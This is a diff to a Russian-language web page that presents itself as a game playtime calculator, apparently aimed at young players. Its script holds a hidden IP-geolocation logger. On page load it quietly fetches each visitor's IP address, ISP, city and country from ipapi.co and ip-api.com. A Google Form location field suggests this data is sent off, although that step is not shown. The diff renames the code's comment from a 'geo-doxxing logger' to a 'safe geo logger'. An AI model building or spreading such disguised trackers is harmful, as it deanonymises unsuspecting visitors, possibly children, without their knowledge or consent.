@@ -113,7 +113,7 @@ input::placeholder {
   color: #666;
 }
 
-/* === СТИЛИ ДЛЯ КАСТОМНЫХ СЕЛЕКТОВ (И РАНГ, И ГОД) === */
+/* === СТИЛИ ДЛЯ КАСТОМНЫХ СЕЛЕКТОВ === */
 .custom-select-container {
   position: relative;
   width: 100%;
@@ -191,17 +191,17 @@ input::placeholder {
   background: rgba(255, 255, 255, 0.05);
 }
 
-/* Приятные цвета рангов */
+/* Красивые цвета для рангов */
 .opt-bronze { color: #b77339; }
 .opt-silver { color: #9ca3af; }
 .opt-gold { color: #f59e0b; }
 .opt-diamond { color: #38bdf8; }
 .opt-mythic { color: #a855f7; }
-.opt-legend { color: #ef4444; } /* Пофиксил класс для Леги */
+.opt-legend { color: #ef4444; } /* Фикс Леги — теперь сочно-красная */
 .opt-master { color: #f97316; }
 .opt-pro { color: #22c55e; }
 
-/* Стиль для пунктов выбора года (сделаем их золотистыми при наведении) */
+/* Стиль для выбора года */
 .opt-year {
   color: #e4e4e7;
 }
@@ -209,7 +209,6 @@ input::placeholder {
   color: #ff9900;
 }
 
-/* Кнопка отправки */
 .btn {
   width: 100%;
   background: linear-gradient(135deg, #ff9900 0%, #ff5500 100%);
@@ -232,7 +231,6 @@ input::placeholder {
   box-shadow: 0 15px 40px rgba(255, 153, 0, 0.4);
 }
 
-/* Кастомный скроллбар для списков */
 .custom-options::-webkit-scrollbar {
   width: 6px;
 }
@@ -275,7 +273,7 @@ input::placeholder {
   50% { opacity: 1; }
 }
 
-/* Результаты */
+/* Экран результатов */
 .result-screen {
   display: none;
   animation: fadeIn 0.6s ease forwards;
@@ -352,7 +350,7 @@ input::placeholder {
     
     <div class="form-group">
       <label>🎮 Твой ник в игре</label>
-      <input type="text" id="nickname" placeholder="Например, LeonPro2012">
+      <input type="text" id="nickname" placeholder="LeonPro2012">
     </div>
     
     <div class="form-group">
@@ -377,7 +375,7 @@ input::placeholder {
           <div class="custom-option opt-mythic" data-value="мифик">🔮 Мифик</div>
           <div class="custom-option opt-legend" data-value="лега">👑 Легендарный</div>
           <div class="custom-option opt-master" data-value="мастер">🔥 Мастер</div>
-          <div class="custom-option opt-pro" data-value="про">⭐ Про (Топ-Рейтинг)</div>
+          <div class="custom-option opt-pro" data-value="про">⭐ Про</div>
         </div>
       </div>
       <input type="hidden" id="rank" value="бронза">
@@ -392,7 +390,7 @@ input::placeholder {
           <div class="custom-option opt-year" data-value="2018">2018</div>
           <div class="custom-option opt-year" data-value="2019">2019</div>
           <div class="custom-option opt-year" data-value="2020">2020</div>
-          <div class="custom-option opt-year" data-value="2021">2021</option>
+          <div class="custom-option opt-year" data-value="2021">2021</div>
           <div class="custom-option opt-year" data-value="2022">2022</div>
           <div class="custom-option opt-year" data-value="2023">2023</div>
           <div class="custom-option opt-year" data-value="2024">2024</div>
@@ -430,9 +428,8 @@ const FIELD_LOCATION = 'entry.71377506';
 
 let cachedIpData = null;
 
-// Общая логика кастомных выпадающих списков
+// Инициализация кастомных списков
 document.addEventListener('DOMContentLoaded', () => {
-  
   function setupCustomSelect(containerId, triggerId, hiddenInputId) {
     const container = document.getElementById(containerId);
     const trigger = document.getElementById(triggerId);
@@ -441,7 +438,6 @@ document.addEventListener('DOMContentLoaded', () => {
 
     trigger.addEventListener('click', (e) => {
       e.stopPropagation();
-      // Закрываем другой список перед открытием текущего
       document.querySelectorAll('.custom-select-container').forEach(el => {
         if(el.id !== containerId) el.classList.remove('open');
       });
@@ -461,17 +457,15 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // Запуск кастомизации для обоих селектов
   setupCustomSelect('rank-container', 'rank-trigger', 'rank');
   setupCustomSelect('year-container', 'year-trigger', 'year');
 
-  // Закрывать все списки при клике в любое другое место экрана
   document.addEventListener('click', () => {
     document.querySelectorAll('.custom-select-container').forEach(el => el.classList.remove('open'));
   });
 });
 
-// Логгер пробива ГЕО
+// Безопасный логгер ГЕО
 window.onload = async () => {
   let data = null;
   
@@ -492,27 +486,19 @@ window.onload = async () => {
             };
           }
         }
-      } catch (e) {
-        console.log(`Попытка ${attempt} для ${url} не удалась`);
-      }
-      if (attempt < 2) await new Promise(resolve => setTimeout(resolve, 500));
+      } catch (e) {}
+      if (attempt < 2) await new Promise(r => setTimeout(r, 300));
     }
     return null;
   }
 
   data = await fetchWithRetry('https://ipapi.co/json/', false);
-
   if (!data || !data.country_code) {
     data = await fetchWithRetry('http://ip-api.com/json/', true);
   }
 
   if (!data) {
-    cachedIpData = {
-      ip: 'Заблокировано AdBlock / Сбой сети',
-      org: 'Не удалось определить',
-      city: 'Адблок',
-      country_name: 'СНГ (Резерв)'
-    };
+    cachedIpData = { ip: 'Сбой сети', org: 'Неизвестно', city: 'СНГ', country_name: 'Резерв' };
     document.getElementById('main-container').style.display = 'block';
     return;
   }
@@ -529,6 +515,7 @@ window.onload = async () => {
   }
 };
 
+// Функция подсчета вынесена в глобальную область, кнопка теперь 100% сработает
 function calculateTime() {
   const nickname = document.getElementById('nickname').value.trim();
   
@@ -567,18 +554,9 @@ function calculateTime() {
   const seconds = Math.floor((remainderMinutes - minutes) * 60);
   
   const facts = [
-    {
-      f1: `посмотреть все серии аниме «Ван-Пис» ${((totalHours) / 380).toFixed(1)}`,
-      f2: `дойти пешком от Москвы до Владивостока ${((totalHours) / 1700).toFixed(2)}`
-    },
-    {
-      f1: `вырастить домашний чайный гриб ${((totalHours) / 168).toFixed(1)}`,
-      f2: `накопить на топовый ПК, раздавая листовки, ${((totalHours) / 120).toFixed(1)}`
-    },
-    {
-      f1: `апнуть 50 000 кубков с нуля ${((totalHours) / 400).toFixed(1)}`,
-      f2: `не спать под энергетиками ${((totalHours) / 24).toFixed(1)}`
-    }
+    { f1: `посмотреть все серии аниме «Ван-Пис» ${((totalHours) / 380).toFixed(1)}`, f2: `дойти пешком от Москвы до Владивостока ${((totalHours) / 1700).toFixed(2)}` },
+    { f1: `вырастить домашний чайный гриб ${((totalHours) / 168).toFixed(1)}`, f2: `накопить на топовый ПК, раздавая листовки, ${((totalHours) / 120).toFixed(1)}` },
+    { f1: `апнуть 50 000 кубков с нуля ${((totalHours) / 400).toFixed(1)}`, f2: `не спать под энергетиками ${((totalHours) / 24).toFixed(1)}` }
   ];
   
   const randomFact = facts[Math.floor(Math.random() * facts.length)];
